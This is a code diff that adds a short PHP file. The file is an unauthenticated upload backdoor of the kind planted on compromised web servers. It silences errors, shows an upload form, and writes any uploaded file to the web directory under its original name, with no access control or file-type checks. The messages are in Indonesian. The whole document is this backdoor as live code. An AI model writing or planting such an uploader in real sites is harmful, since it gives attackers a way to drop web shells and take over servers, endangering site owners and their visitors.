@@ -1,0 +1,10 @@
+<?php
+@ini_set('output_buffering',0);
+@ini_set('display_errors', 0);
+echo '<center><form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
+echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
+if( $_POST['_upl'] == "Upload" ) {
+if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload Sukses Sayang !!!<b><br><br>'; }
+else { echo '<b>Gagal Upload Sayang :3 !!!</b><br><br>'; }
+}
+?>
